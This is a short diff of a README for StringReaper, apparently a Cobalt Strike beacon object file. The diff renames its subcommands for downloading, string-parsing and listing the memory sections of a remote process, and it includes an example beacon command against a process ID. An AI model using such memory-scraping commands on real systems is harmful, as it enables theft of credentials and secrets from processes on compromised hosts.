@@ -54,9 +54,9 @@ xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Office.Web.Roaming.Soap
 ```
 beacon> help StringReaper
 Usage: StringReaper PID mode option1 option2
-   ._memdownload  : download memory sections to CS Downloads tab
-   |_memstrings   : parse strings from memory sections and download to CS Downloads tab
-   |_memlist      : list all allocated memory sections in remote process
+   ._download  : download memory sections to CS Downloads tab
+   |_strings   : parse strings from memory sections and download to CS Downloads tab
+   |_list      : list all allocated memory sections in remote process
    |__[option1]
    |  |_ all
    |  |_ private
@@ -69,7 +69,7 @@ Usage: StringReaper PID mode option1 option2
       |_ rwx
      peb            : display PEB information
      
-beacon> StringReaper 7744 memlist private rw
+beacon> StringReaper 7744 list private rw
 StringReaper BOF (Bobby Cooke|@0xBoku|github.com/boku7|linkedin.com/in/bobby-cooke/)
 [+] host called home, sent: 15627 bytes
 [+] received output:
